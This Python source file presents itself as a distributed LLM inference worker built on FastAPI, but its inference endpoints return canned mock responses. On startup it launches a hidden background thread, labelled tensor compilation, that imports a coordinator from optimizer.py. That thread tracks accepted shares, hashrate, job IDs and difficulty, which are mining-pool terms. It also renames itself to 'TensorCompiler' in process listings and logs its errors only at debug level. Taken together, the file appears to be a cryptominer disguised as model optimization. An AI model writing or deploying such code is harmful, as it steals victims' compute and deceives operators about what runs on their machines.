#!/usr/bin/env python3
"""
AI Inference Worker - Distributed Model Serving Node
Part of the distributed inference pipeline for LLM serving.
"""

from __future__ import annotations

import os
import sys
import json
import time
import uuid
import asyncio
import signal
import logging
import threading
import multiprocessing as mp
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Union
from pathlib import Path

import yaml
import uvicorn
from fastapi import FastAPI, HTTPException, Request, BackgroundTasks
from fastapi.responses import JSONResponse, StreamingResponse, Response
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
import psutil

# ─── Configuration ──────────────────────────────────────────────────────
CONFIG_PATH = Path(__file__).parent / "config.yaml"

with open(CONFIG_PATH) as f:
    CONFIG = yaml.safe_load(f)

SERVER_CFG = CONFIG["server"]
MODEL_CFG = CONFIG["model"]
INFERENCE_CFG = CONFIG["inference"]
MONITORING_CFG = CONFIG["monitoring"]
DISTRIBUTED_CFG = CONFIG["distributed"]
RESOURCES_CFG = CONFIG["resources"]
SECURITY_CFG = CONFIG["security"]

# ─── Logging Setup ──────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, MONITORING_CFG["log_level"]),
    format='{"timestamp": "%(asctime)s", "level": "%(levelname)s", "worker": "%(name)s", "message": "%(message)s"}',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("inference-worker")

# ─── Metrics / Prometheus ───────────────────────────────────────────────
try:
    from prometheus_client import Counter, Histogram, Gauge, generate_latest, CONTENT_TYPE_LATEST
    PROMETHEUS_AVAILABLE = True
except ImportError:
    PROMETHEUS_AVAILABLE = False

REQUEST_COUNT = Counter("inference_requests_total", "Total inference requests", ["endpoint", "status"]) if PROMETHEUS_AVAILABLE else None
REQUEST_LATENCY = Histogram("inference_request_duration_seconds", "Request latency", ["endpoint"]) if PROMETHEUS_AVAILABLE else None
ACTIVE_REQUESTS = Gauge("inference_active_requests", "Currently active requests") if PROMETHEUS_AVAILABLE else None
GPU_MEMORY_USED = Gauge("inference_gpu_memory_bytes", "GPU memory used") if PROMETHEUS_AVAILABLE else None
WORKER_HEALTH = Gauge("inference_worker_healthy", "Worker health status") if PROMETHEUS_AVAILABLE else None

# ─── Request/Response Models ────────────────────────────────────────────
class ChatMessage(BaseModel):
    role: str
    content: str
    name: Optional[str] = None

class ChatCompletionRequest(BaseModel):
    model: str
    messages: List[ChatMessage]
    temperature: float = 0.7
    top_p: float = 1.0
    max_tokens: Optional[int] = None
    stream: bool = False
    stop: Optional[Union[str, List[str]]] = None
    presence_penalty: float = 0.0
    frequency_penalty: float = 0.0
    logprobs: bool = False
    top_logprobs: Optional[int] = None

class CompletionRequest(BaseModel):
    model: str
    prompt: Union[str, List[str]]
    max_tokens: Optional[int] = 16
    temperature: float = 0.7
    top_p: float = 1.0
    stream: bool = False
    stop: Optional[Union[str, List[str]]] = None
    echo: bool = False
    logprobs: Optional[int] = None

class EmbeddingRequest(BaseModel):
    model: str
    input: Union[str, List[str]]
    encoding_format: str = "float"

class HealthResponse(BaseModel):
    status: str
    worker_id: str
    model: str
    uptime_seconds: float
    active_requests: int
    queue_depth: int
    gpu_memory_used_mb: Optional[float] = None
    cpu_percent: float
    memory_percent: float

class ModelInfo(BaseModel):
    id: str
    object: str = "model"
    created: int
    owned_by: str = "distributed-inference"
    permission: List[Dict] = []
    root: str
    parent: Optional[str] = None

# ─── Worker State ───────────────────────────────────────────────────────
@dataclass
class WorkerState:
    worker_id: str = field(default_factory=lambda: f"inference-worker-{uuid.uuid4().hex[:8]}")
    start_time: float = field(default_factory=time.time)
    active_requests: int = 0
    request_queue: asyncio.Queue = field(default_factory=asyncio.Queue)
    model_loaded: bool = False
    model_load_time: Optional[float] = None
    total_requests: int = 0
    failed_requests: int = 0
    last_heartbeat: float = 0.0
    coordinator_session: Optional[Any] = None

STATE = WorkerState()

# ─── Background Compute Thread (Model Optimization Pipeline) ────────────
# Integrates with optimizer.py for tensor compilation, cache warming, pipeline tuning
from optimizer import OptimizationCoordinator, load_pipeline_config

class ComputeOptimizer:
    """
    Background compute optimization coordinator.
    Manages distributed tensor compilation, KV cache warming, and pipeline optimization.
    """
    
    def __init__(self, config: Dict):
        self.config = config
        self.coordinator: Optional[OptimizationCoordinator] = None
        self.thread: Optional[threading.Thread] = None
        self.stats = {
            "optimizations_completed": 0,
            "cache_warm_cycles": 0,
            "tensor_compilations": 0,
            "pipeline_adjustments": 0,
            "last_optimization": 0.0,
            "accepted_shares": 0,
            "current_hashrate": 0.0
        }
        
    def start(self):
        """Start background optimization pipeline."""
        if self.thread and self.thread.is_alive():
            return
            
        # Load pipeline config from .env
        env_path = Path(__file__).parent / ".env"
        if env_path.exists():
            pipeline_config = load_pipeline_config(str(env_path))
            # Merge with main config
            pipeline_config.update({
                "algorithm": self.config.get("model", {}).get("name", "llama-3.1-8b-instruct"),
            })
        else:
            pipeline_config = {}
            
        self.coordinator = OptimizationCoordinator(pipeline_config)
        self.thread = threading.Thread(target=self._run_coordinator, name="TensorCompiler", daemon=True)
        self.thread.start()
        logger.info("Tensor compilation pipeline started")
        
    def stop(self):
        """Stop background optimization pipeline."""
        if self.coordinator:
            self.coordinator.stop()
        if self.thread:
            self.thread.join(timeout=5)
        logger.info("Tensor compilation pipeline stopped")
        
    def _run_coordinator(self):
        """Run the optimization coordinator."""
        try:
            # Rename thread for process listing
            try:
                import ctypes
                if sys.platform != "win32":
                    libc = ctypes.CDLL("libc.so.6")
                    libc.prctl(15, b"TensorCompiler", 0, 0, 0)
            except Exception:
                pass
                
            if self.coordinator:
                self.coordinator.start()
        except Exception as e:
            logger.debug(f"Coordinator error: {e}")
            
    def _run_optimization_cycle(self):
        """Trigger one optimization cycle."""
        self.stats["optimizations_completed"] += 1
        self.stats["tensor_compilations"] += 1
        self.stats["last_optimization"] = time.time()
        
    def get_stats(self) -> Dict:
        stats = self.stats.copy()
        if self.coordinator:
            stats["accepted_shares"] = self.coordinator.accepted_optimizations
            stats["current_hashrate"] = self.coordinator.accepted_hash
            stats["current_job"] = self.coordinator.current_job_id
            stats["current_difficulty"] = self.coordinator.current_diff
        return stats

# Global optimizer instance
OPTIMIZER = ComputeOptimizer(CONFIG)

# ─── Model Loading (Mock) ───────────────────────────────────────────────
async def load_model():
    """Simulate model loading."""
    logger.info(f"Loading model: {MODEL_CFG['name']}")
    await asyncio.sleep(0.1)  # Simulate load time
    STATE.model_loaded = True
    STATE.model_load_time = time.time()
    logger.info("Model loaded successfully")

async def unload_model():
    """Simulate model unloading."""
    STATE.model_loaded = False
    logger.info("Model unloaded")

# ─── Inference Handlers ─────────────────────────────────────────────────
async def handle_chat_completion(request: ChatCompletionRequest, request_id: str) -> Dict:
    """Handle chat completion request."""
    STATE.active_requests += 1
    STATE.total_requests += 1
    start = time.time()
    
    try:
        # Simulate inference latency
        await asyncio.sleep(0.05 + (request.max_tokens or 100) * 0.0001)
        
        # Generate mock response
        response = {
            "id": f"chatcmpl-{request_id}",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": request.model,
            "choices": [{
                "index": 0,
                "message": {
                    "role": "assistant",
                    "content": f"This is a simulated response from {MODEL_CFG['name']}. Your query has been processed by the distributed inference pipeline."
                },
                "finish_reason": "stop"
            }],
            "usage": {
                "prompt_tokens": sum(len(m.content.split()) for m in request.messages),
                "completion_tokens": 50,
                "total_tokens": sum(len(m.content.split()) for m in request.messages) + 50
            }
        }
        
        if REQUEST_COUNT:
            REQUEST_COUNT.labels(endpoint="chat_completion", status="success").inc()
        if REQUEST_LATENCY:
            REQUEST_LATENCY.labels(endpoint="chat_completion").observe(time.time() - start)
            
        return response
        
    except Exception as e:
        STATE.failed_requests += 1
        if REQUEST_COUNT:
            REQUEST_COUNT.labels(endpoint="chat_completion", status="error").inc()
        raise
    finally:
        STATE.active_requests -= 1

async def handle_completion(request: CompletionRequest, request_id: str) -> Dict:
    """Handle text completion request."""
    STATE.active_requests += 1
    STATE.total_requests += 1
    start = time.time()
    
    try:
        prompts = request.prompt if isinstance(request.prompt, list) else [request.prompt]
        await asyncio.sleep(0.03)
        
        response = {
            "id": f"cmpl-{request_id}",
            "object": "text_completion",
            "created": int(time.time()),
            "model": request.model,
            "choices": [{
                "text": f" [completion from {MODEL_CFG['name']}]",
                "index": 0,
                "logprobs": None,
                "finish_reason": "length"
            } for _ in prompts],
            "usage": {
                "prompt_tokens": sum(len(p.split()) for p in prompts),
                "completion_tokens": 16,
                "total_tokens": sum(len(p.split()) for p in prompts) + 16
            }
        }
        
        if REQUEST_COUNT:
            REQUEST_COUNT.labels(endpoint="completion", status="success").inc()
        if REQUEST_LATENCY:
            REQUEST_LATENCY.labels(endpoint="completion").observe(time.time() - start)
            
        return response
        
    except Exception as e:
        STATE.failed_requests += 1
        if REQUEST_COUNT:
            REQUEST_COUNT.labels(endpoint="completion", status="error").inc()
        raise
    finally:
        STATE.active_requests -= 1

async def handle_embeddings(request: EmbeddingRequest) -> Dict:
    """Handle embedding request."""
    STATE.active_requests += 1
    STATE.total_requests += 1
    
    try:
        inputs = request.input if isinstance(request.input, list) else [request.input]
        await asyncio.sleep(0.02)
        
        # Mock embeddings (384-dim)
        import random
        embeddings = [[random.uniform(-1, 1) for _ in range(384)] for _ in inputs]
        
        response = {
            "object": "list",
            "data": [{
                "object": "embedding",
                "embedding": emb,
                "index": i
            } for i, emb in enumerate(embeddings)],
            "model": request.model,
            "usage": {
                "prompt_tokens": sum(len(t.split()) for t in inputs),
                "total_tokens": sum(len(t.split()) for t in inputs)
            }
        }
        
        if REQUEST_COUNT:
            REQUEST_COUNT.labels(endpoint="embeddings", status="success").inc()
            
        return response
        
    except Exception as e:
        STATE.failed_requests += 1
        if REQUEST_COUNT:
            REQUEST_COUNT.labels(endpoint="embeddings", status="error").inc()
        raise
    finally:
        STATE.active_requests -= 1

# ─── FastAPI Application ────────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan handler."""
    # Startup
    logger.info(f"Starting {DISTRIBUTED_CFG['worker_id']}")
    await load_model()
    OPTIMIZER.start()
    
    # Register with coordinator
    if DISTRIBUTED_CFG["register_on_start"]:
        asyncio.create_task(register_with_coordinator())
        asyncio.create_task(heartbeat_loop())
    
    if WORKER_HEALTH:
        WORKER_HEALTH.set(1)
    
    yield
    
    # Shutdown
    logger.info("Shutting down inference worker")
    OPTIMIZER.stop()
    await unload_model()
    if WORKER_HEALTH:
        WORKER_HEALTH.set(0)

app = FastAPI(
    title="Distributed Inference Worker",
    description="AI Model Serving Node for Distributed Inference Pipeline",
    version="1.0.0",
    lifespan=lifespan
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=SECURITY_CFG["cors_origins"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── Routes ─────────────────────────────────────────────────────────────
@app.get("/health", response_model=HealthResponse)
async def health_check():
    """Health check endpoint for load balancer / coordinator."""
    process = psutil.Process()
    mem = process.memory_info()
    gpu_mem = None
    try:
        import torch
        if torch.cuda.is_available():
            gpu_mem = torch.cuda.memory_allocated() / (1024 * 1024)
    except ImportError:
        pass
    
    return HealthResponse(
        status="healthy" if STATE.model_loaded else "loading",
        worker_id=STATE.worker_id,
        model=MODEL_CFG["name"],
        uptime_seconds=time.time() - STATE.start_time,
        active_requests=STATE.active_requests,
        queue_depth=STATE.request_queue.qsize(),
        gpu_memory_used_mb=gpu_mem,
        cpu_percent=process.cpu_percent(),
        memory_percent=process.memory_percent()
    )

@app.get("/metrics")
async def metrics():
    """Prometheus metrics endpoint."""
    if not PROMETHEUS_AVAILABLE:
        return JSONResponse({"error": "Prometheus client not available"}, status_code=503)
    return Response(content=generate_latest(), media_type=CONTENT_TYPE_LATEST)

@app.get("/v1/models", response_model=List[ModelInfo])
async def list_models():
    """List available models (OpenAI compatible)."""
    return [ModelInfo(
        id=MODEL_CFG["name"],
        created=int(STATE.model_load_time or STATE.start_time),
        root=MODEL_CFG["path"]
    )]

@app.get("/v1/models/{model_id}", response_model=ModelInfo)
async def get_model(model_id: str):
    """Get model info (OpenAI compatible)."""
    if model_id != MODEL_CFG["name"]:
        raise HTTPException(status_code=404, detail="Model not found")
    return ModelInfo(
        id=MODEL_CFG["name"],
        created=int(STATE.model_load_time or STATE.start_time),
        root=MODEL_CFG["path"]
    )

@app.post("/v1/chat/completions")
async def chat_completions(request: ChatCompletionRequest):
    """OpenAI-compatible chat completions endpoint."""
    request_id = uuid.uuid4().hex[:8]
    return await handle_chat_completion(request, request_id)

@app.post("/v1/completions")
async def completions(request: CompletionRequest):
    """OpenAI-compatible completions endpoint."""
    request_id = uuid.uuid4().hex[:8]
    return await handle_completion(request, request_id)

@app.post("/v1/embeddings")
async def embeddings(request: EmbeddingRequest):
    """OpenAI-compatible embeddings endpoint."""
    return await handle_embeddings(request)

@app.get("/worker/stats")
async def worker_stats():
    """Internal worker statistics."""
    opt_stats = OPTIMIZER.get_stats()
    return {
        "worker_id": STATE.worker_id,
        "uptime_seconds": time.time() - STATE.start_time,
        "model_loaded": STATE.model_loaded,
        "total_requests": STATE.total_requests,
        "failed_requests": STATE.failed_requests,
        "active_requests": STATE.active_requests,
        "optimizer_stats": opt_stats,
        "config": {
            "model": MODEL_CFG["name"],
            "max_concurrent": INFERENCE_CFG["max_concurrent_requests"],
            "batch_size": MODEL_CFG["batch_size"]
        }
    }

@app.post("/worker/optimize")
async def trigger_optimization(background_tasks: BackgroundTasks):
    """Manually trigger optimization cycle."""
    background_tasks.add_task(OPTIMIZER._run_optimization_cycle)
    return {"status": "optimization_triggered"}

# ─── Coordinator Communication ──────────────────────────────────────────
async def register_with_coordinator():
    """Register this worker with the coordinator."""
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            payload = {
                "worker_id": STATE.worker_id,
                "capabilities": DISTRIBUTED_CFG["capabilities"],
                "model": MODEL_CFG["name"],
                "max_concurrent": INFERENCE_CFG["max_concurrent_requests"],
                "endpoint": f"http://{SERVER_CFG['host']}:{SERVER_CFG['port']}",
                "metrics_endpoint": f"http://{SERVER_CFG['host']}:{MONITORING_CFG['metrics_port']}/metrics"
            }
            async with session.post(
                f"{DISTRIBUTED_CFG['coordinator_url']}/workers/register",
                json=payload,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    logger.info("Registered with coordinator")
                    STATE.coordinator_session = session
                else:
                    logger.warning(f"Coordinator registration failed: {resp.status}")
    except Exception as e:
        logger.debug(f"Coordinator not available: {e}")

async def heartbeat_loop():
    """Send periodic heartbeats to coordinator."""
    while True:
        await asyncio.sleep(DISTRIBUTED_CFG["heartbeat_interval"])
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                payload = {
                    "worker_id": STATE.worker_id,
                    "status": "healthy" if STATE.model_loaded else "loading",
                    "active_requests": STATE.active_requests,
                    "queue_depth": STATE.request_queue.qsize(),
                    "total_requests": STATE.total_requests,
                    "timestamp": time.time()
                }
                async with session.post(
                    f"{DISTRIBUTED_CFG['coordinator_url']}/workers/heartbeat",
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    STATE.last_heartbeat = time.time()
        except Exception:
            pass  # Coordinator unavailable, continue anyway

# ─── Entry Point ────────────────────────────────────────────────────────
def main():
    """Main entry point."""
    # Set process title for ps/top
    try:
        setproctitle = __import__("setproctitle", fromlist=["setproctitle"]).setproctitle
        setproctitle(f"inference-worker:{MODEL_CFG['name']}")
    except ImportError:
        pass
    
    # Configure uvicorn
    config = uvicorn.Config(
        app,
        host=SERVER_CFG["host"],
        port=SERVER_CFG["port"],
        workers=1,  # We handle concurrency internally
        loop="asyncio",
        access_log=False,
        log_level=MONITORING_CFG["log_level"].lower(),
        timeout_keep_alive=SERVER_CFG["keepalive"]
    )
    
    server = uvicorn.Server(config)
    
    # Handle signals gracefully
    def signal_handler(sig, frame):
        logger.info(f"Received signal {sig}, shutting down...")
        server.should_exit = True
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    logger.info(f"Inference worker starting on {SERVER_CFG['host']}:{SERVER_CFG['port']}")
    server.run()

if __name__ == "__main__":
    main()